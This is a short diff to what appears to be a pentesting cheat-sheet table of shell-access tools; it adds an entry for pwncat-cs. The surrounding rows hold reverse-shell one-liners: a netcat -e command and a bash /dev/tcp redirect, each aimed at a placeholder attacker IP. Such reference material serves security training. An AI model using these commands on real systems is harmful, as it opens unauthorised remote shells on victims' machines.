@@ -20,6 +20,7 @@ Getting a shell and access to a target system.
 | `netcat <attacker ip> <port> -e <the shell executable>` | Sends process output to a TCP connection and gets input from TCP connection | Used for opening a reverse shell (victim to target) on the target | Remote Shell, TCP |
 | `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` | Sends process output to a TCP connection and gets input from TCP connection | Used for opening a reverse shell (victim to target) on the target if netcat is not usable for some reason (of if you don't want to download an extra file). It uses piping from bash to a tcp socket. | Bash, Reverse Shell, TCP |
 | rlwrap | Readline wrapper | Make netcat use arrow keys | Netcat |
+|  pwncat-cs | A netcat alternative aimed towards hackers | | Netcat, Shell, Manager |
 
 ## Sniffing
 Packet and network sniffing for various protocols.
